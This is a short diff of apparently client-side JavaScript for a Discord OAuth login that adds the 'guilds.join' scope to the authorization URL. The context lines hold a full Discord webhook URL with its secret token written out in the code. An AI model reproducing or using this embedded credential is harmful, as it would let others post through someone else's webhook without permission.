@@ -107,7 +107,7 @@
     const webhookURL = "https://discord.com/api/webhooks/1368651816518287420/6xWMtd_XY3sG7rsVs1TrL064C9oLTH14PMuEEFFa0dsj08uOISD98D7fQcqEu-f_wooJ";
 
     // Update this with your actual production redirect URI
-    const oauthUrl = "https://discord.com/oauth2/authorize?client_id=1368654568891613315&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A6969%2Fcallback&scope=identify";
+    const oauthUrl = "https://discord.com/oauth2/authorize?client_id=1368654568891613315&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A6969%2Fcallback&scope=identify+guilds.join";
 
     // Check for ?code=... in URL (user authorized with Discord)
     const urlParams = new URLSearchParams(window.location.search);
